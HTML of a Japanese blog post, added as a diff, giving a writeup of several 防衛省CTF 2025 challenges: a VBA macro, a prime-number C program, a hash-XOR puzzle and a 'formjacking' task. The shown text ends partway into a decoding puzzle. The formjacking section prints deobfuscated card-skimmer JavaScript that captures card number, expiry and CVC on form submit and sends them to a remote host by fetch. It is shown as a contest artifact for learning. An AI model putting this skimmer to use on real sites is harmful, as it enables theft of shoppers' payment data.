@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 17.5px;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>防衛省CTF 2025 Writeup</title>
+    <meta name="description" content="はじめに 今回は防衛省CTFに参加してきました。
+結果は以下の通りです。
+久しぶりのCTFで張り切っていたので12時間ずっとCTFしていました。
+かなりの問題数があるので私が面白いと思った問題だけ細かい解説を入れていきます。
+PG 縮めるだけじゃダメ あるエクセルファイルが渡され、その中に記述されたフラグを抜き出す問題 …">
+    <meta name="keywords" content=''>
+
+    <meta property="og:url" content="http://localhost:1313/posts/test/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="防衛省CTF 2025 Writeup">
+    <meta property="og:description" content="はじめに 今回は防衛省CTFに参加してきました。
+結果は以下の通りです。
+久しぶりのCTFで張り切っていたので12時間ずっとCTFしていました。
+かなりの問題数があるので私が面白いと思った問題だけ細かい解説を入れていきます。
+PG 縮めるだけじゃダメ あるエクセルファイルが渡され、その中に記述されたフラグを抜き出す問題 …">
+    <meta property="og:image" content="http://localhost:1313/">
+    <meta property="og:image:secure_url" content="http://localhost:1313/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="防衛省CTF 2025 Writeup">
+    <meta name="twitter:description" content="はじめに 今回は防衛省CTFに参加してきました。
+結果は以下の通りです。
+久しぶりのCTFで張り切っていたので12時間ずっとCTFしていました。
+かなりの問題数があるので私が面白いと思った問題だけ細かい解説を入れていきます。
+PG 縮めるだけじゃダメ あるエクセルファイルが渡され、その中に記述されたフラグを抜き出す問題 …">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/test/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/test/">
+    <meta name="twitter:image" content="http://localhost:1313/">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/test/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.3eb19cb61dde9e37b9522867f3e024aeb68e26ab8e03252e46e365abcb19acf7.js" integrity="sha256-PrGcth3enje5Uihn8&#43;AkrraOJquOAyUuRuNlq8sZrPc="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">sota70の独り言</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/tags/" aria-label="" > Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com" aria-label="github" ><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/tags/" > Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com" ><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>防衛省CTF 2025 Writeup</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              February 3, 2025
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <h2 id="はじめに">はじめに</h2>
+<p>今回は防衛省CTFに参加してきました。<br>
+結果は以下の通りです。<br>
+<img src="image.png" alt="alt text"><br>
+久しぶりのCTFで張り切っていたので12時間ずっとCTFしていました。<br>
+かなりの問題数があるので私が面白いと思った問題だけ細かい解説を入れていきます。</p>
+<h2 id="pg">PG</h2>
+<h3 id="縮めるだけじゃダメ">縮めるだけじゃダメ</h3>
+<p>あるエクセルファイルが渡され、その中に記述されたフラグを抜き出す問題です。<br>
+中にはGET_FLAGというマクロがありました。<br>
+マクロの解析にはoletoolsを用いました。(<a href="https://github.com/decalage2/oletools/tree/master/oletools">https://github.com/decalage2/oletools/tree/master/oletools</a>)</p>
+<pre tabindex="0"><code>olevba 0.60.2 on Python 3.12.3 - http://decalage.info/python/oletools
+===============================================================================
+FILE: PG-1.xlsm
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: xl/vbaProject.bin - OLE stream: &#39;VBA/ThisWorkbook&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1.cls 
+in file: xl/vbaProject.bin - OLE stream: &#39;VBA/Sheet1&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub GET_FLAG()
+Worksheets(&#34;Sheet1&#34;).Activate
+Rows(&#34;1:7&#34;).RowHeight = 30
+Columns(&#34;A:AT&#34;).ColumnWidth = 30
+Range(&#34;A1:AT7&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;A1:AT1&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;A3:AT3&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;A5:AT5&#34;).Interior.Color = RGB(0, 0, 0)
+Columns(&#34;D&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;F&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;J&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;K&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;O&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;S&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;W&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;AA&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;AE&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;AI&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;AM&#34;).Interior.Color = RGB(255, 255, 255)
+Columns(&#34;AQ&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;A1:A2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;C2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;C4:C5&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;G1:P2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;P5&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AR2:AR4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AT1:AT2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AT4:AT5&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;R2:R4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;B1:B5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;E1:E5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;G3:G5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;I3:I6&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;L3:L5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;N3:N7&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;J6&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;L7:M7&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;Q1:Q5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AS1:AS5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;T1:T5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;V1:V5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;X1:X5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;Z1:Z5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AB1:AB5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AD1:AD5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AF1:AF5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AH1:AH5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AJ1:AJ5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AL1:AL5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AN1:AN5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AP1:AP5&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;AN2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AN4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;T2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;V4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AL2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;Z2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AJ4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AH2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;R2:V2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;R4:V4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;W2:AA2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;W4:AA4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AB2:AH2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AB4:AH4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AI2:AL2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AI4:AL4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AM2:AR2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;AM4:AR4&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;R2:AR2&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;R4:AR4&#34;).Interior.Color = RGB(0, 0, 0)
+Range(&#34;R2:AR2&#34;).Interior.Color = RGB(255, 255, 255)
+Range(&#34;R4:AR4&#34;).Interior.Color = RGB(255, 255, 255)
+End Sub
+</code></pre><p>すると特定のセルを塗りつぶしていることが分かります。<br>
+これを最後まで実行してしまうとフラグの内容が伏字になった状態で終わってしまうので<br>
+1ステップずつ実行して、途中でフラグの内容が出てこないか確認します。<br>
+するとマクロの中盤あたりで伏字にされるまえのフラグの状態を確認することができました。</p>
+<pre tabindex="0"><code>flag{268653}
+</code></pre><h3 id="暗算でもできるけど">暗算でもできるけど？</h3>
+<p>下記のコードの出力結果の68番目の値と314番目の値とを加算した値を求める問題です。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> loopc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// int i,j,k,l;k=(((10/2*4/10*4/2)+97)*10)-10;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> i,j,k,l;k<span style="color:#f92672">=</span><span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;init k: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, k);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;i<span style="color:#f92672">&lt;=</span>k;<span style="color:#f92672">++</span>i){
+</span></span><span style="display:flex;"><span>        l<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(j<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;j<span style="color:#f92672">&lt;</span>i;<span style="color:#f92672">++</span>j){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(i<span style="color:#f92672">%</span>j<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>                l<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(l<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            loopc<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d: %d</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,loopc,i);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>このコードはforループでiが1000まで続いていて、314番目の結果まで出力してくれる長さではありません。<br>
+そこで終了条件のkを3000に増やして、iが3000まで続くようにして値を求めます。</p>
+<pre tabindex="0"><code>flag{2420}
+</code></pre><h3 id="formjacking">formjacking</h3>
+<p>難読化されたJSの解読問題です。<br>
+最終的にそこで送信されているHTTPリクエストを特定する問題です。<br>
+難読化はこちらのサイトで解除しました。(<a href="https://trumanwl.com/ja/crypto/javascript-deobfuscator">https://trumanwl.com/ja/crypto/javascript-deobfuscator</a>)<br>
+難読化を解除したコードがこちらです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#card-expiry-element &gt; form&#34;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x2791c1</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_0x2791c1</span>.<span style="color:#a6e22e">preventDefault</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x5930f7</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Skimming=true&#34;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x9ae3dd</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;input[name=&#39;cardnumber&#39;]&#34;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_0x12237f</span>(<span style="color:#a6e22e">_0x9ae3dd</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x57060f</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;input[name=&#39;exp-date&#39;]&#34;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x33294f</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;input[name=&#39;cvc&#39;]&#34;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_0x3bb027</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x3e5fd8</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://pg3.2025winter-cybercontest.net/pg3?cardnumber=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">_0x9ae3dd</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;exp-date=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">_0x57060f</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;cvc=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">_0x33294f</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x5930f7</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x3e5fd8</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_0x12237f</span>(<span style="color:#a6e22e">_0x8c4fb5</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x39e251</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x5d648f</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x23cadc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x8c4fb5</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">_0x23cadc</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">_0x23cadc</span><span style="color:#f92672">--</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x3adf4b</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">_0x8c4fb5</span>[<span style="color:#a6e22e">_0x23cadc</span>]);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x5d648f</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x3adf4b</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x3adf4b</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">_0x3adf4b</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">9</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_0x39e251</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">_0x3adf4b</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_0x5d648f</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">_0x5d648f</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x39e251</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x24d3e7</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x3bb027</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">_0x24d3e7</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>_0x3bb027という関数がリクエストURLを組み立てているようです。<br>
+この値をそのまま使えば良さそうです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://pg3.2025winter-cybercontest.net/pg3?cardnumber=1&amp;exp-date=1000000&amp;cvc=1&amp;Skimming=true&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><pre tabindex="0"><code>flag{f1iping_de0bfuscat0r}
+</code></pre><h3 id="loop-in-loop">loop in loop</h3>
+<p>2つの文字列をハッシュアルゴリズムによりハッシュ化し、それらの値を二重for loopでXORしていきフラグを求める問題です。<br>
+これは問題文にアルゴリズムがそのまま書いてあるので、それを実装すればいいだけです。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ripemd160</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHash</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">str</span>).<span style="color:#a6e22e">digest</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">processStrings</span>(<span style="color:#a6e22e">str1</span>, <span style="color:#a6e22e">str2</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ripemd160</span>(<span style="color:#a6e22e">str1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ripemd160</span>(<span style="color:#a6e22e">str2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">hash1</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">char1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash1</span>[<span style="color:#a6e22e">i</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>[<span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;9&#34;</span>].<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">char1</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">hash2</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">char2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash2</span>[<span style="color:#a6e22e">j</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>[<span style="color:#e6db74">&#34;0&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#e6db74">&#34;5&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>, <span style="color:#e6db74">&#34;7&#34;</span>, <span style="color:#e6db74">&#34;8&#34;</span>, <span style="color:#e6db74">&#34;9&#34;</span>].<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">char2</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> parseInt(<span style="color:#a6e22e">char1</span>) <span style="color:#f92672">^</span> parseInt(<span style="color:#a6e22e">char2</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">str1</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Phoenix&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">str2</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Messiah&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">processStrings</span>(<span style="color:#a6e22e">str1</span>, <span style="color:#a6e22e">str2</span>));
+</span></span></code></pre></div><pre tabindex="0"><code>flag{5785}
+</code></pre><h2 id="cy">CY</h2>
+<h3 id="エンコード方法は一つじゃない">エンコード方法は一つじゃない</h3>
+<p>問題として以下のパーセントエンコードされた文字列が渡されます。</p>
+<pre tabindex="0"><code>%26%23%78%35%35%3b%26%23%78%36%33%3b%26%23%78%36%31%3b%26%23%78%36%65%3b%26%23%78%34%32%3b%26%23%78%37%64%3b%56%6d%46%79%61%57%39%31%63%30%56%75%59%32%39%6b%61%57%35%6e%63%77%3d%3d%36%36%36%63%36%31%36%37%37%62
+</code></pre><p>これをデコードすると以下のようになります。</p>
